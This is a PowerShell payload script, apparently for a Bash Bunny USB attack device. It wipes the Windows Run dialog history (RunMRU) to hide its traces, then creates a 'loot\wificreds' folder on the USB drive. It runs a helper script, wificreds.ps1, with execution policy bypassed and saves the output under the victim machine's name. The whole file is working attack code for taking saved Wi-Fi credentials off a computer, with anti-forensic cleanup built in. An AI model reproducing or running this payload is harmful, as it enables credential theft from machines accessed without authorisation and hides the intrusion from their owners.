# Remove run history
powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"

# Get the path and file name that you are using for output
# find connected bashbunny drive:
$VolumeName = "BashBunny"
$backupDrive = $null
get-wmiobject win32_logicaldisk | % {
    if ($_.VolumeName -eq $VolumeName) {
        $backupDrive = $_.DeviceID
    }
}

# See if a loot folder exist in usb. If not create one
$TARGETDIR = $backupDrive + "\loot"
if(!(Test-Path -Path $TARGETDIR )){
    New-Item -ItemType directory -Path $TARGETDIR
}

# See if the wificreds folder exists in loot folder. If not create one
$TARGETDIR = $backupDrive + "\loot\wificreds"
if(!(Test-Path -Path $TARGETDIR )){
    New-Item -ItemType directory -Path $TARGETDIR
}

# Create a path that will be used to make the file
$datetime = get-date -f yyyy-MM-dd_HH-mm
$computerSystem = Get-CimInstance CIM_ComputerSystem
$backupPath = $TARGETDIR + "\" + $computerSystem.Name + " - " + $datetime + ".txt"

# Create output from info script
$TARGETDIR = $MyInvocation.MyCommand.Path
$TARGETDIR = $TARGETDIR -replace ".......$"
cd $TARGETDIR
PowerShell.exe -ExecutionPolicy Bypass -File wificreds.ps1 > $backupPath